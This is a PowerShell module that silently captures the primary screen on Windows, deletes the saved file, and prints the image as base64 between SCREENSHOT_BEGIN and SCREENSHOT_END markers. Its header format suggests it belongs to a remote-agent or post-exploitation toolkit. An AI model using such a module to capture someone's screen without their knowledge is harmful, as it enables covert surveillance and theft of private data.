<#
Module: Capture-Screenshot
Description: Takes screenshots
Author: Security
Version: 1.0
RequiresAdmin: No
SupportedOS: Windows
Arguments: delay:int
Help: Takes screenshots
#>

function Invoke-Capture-Screenshot {
    param($delay=1)
    
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    
    if($delay -gt 0) { Start-Sleep -Seconds $delay }

    try {
        # Create bitmap
        $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
        $screenshot = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
        $graphics = [System.Drawing.Graphics]::FromImage($screenshot)
        $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)

        # Save to temp file with timestamp
        $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
        $tempFile = "$env:TEMP\screenshot_$timestamp.png"
        $screenshot.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)

        # Convert to base64 and send
        $bytes = [System.IO.File]::ReadAllBytes($tempFile)
        $base64 = [Convert]::ToBase64String($bytes)
        Write-Output "SCREENSHOT_BEGIN"
        Write-Output $base64
        Write-Output "SCREENSHOT_END"

        # Cleanup
        Remove-Item $tempFile
        $graphics.Dispose()
        $screenshot.Dispose()

    } catch {
        Write-Error $_.Exception.Message
    }
}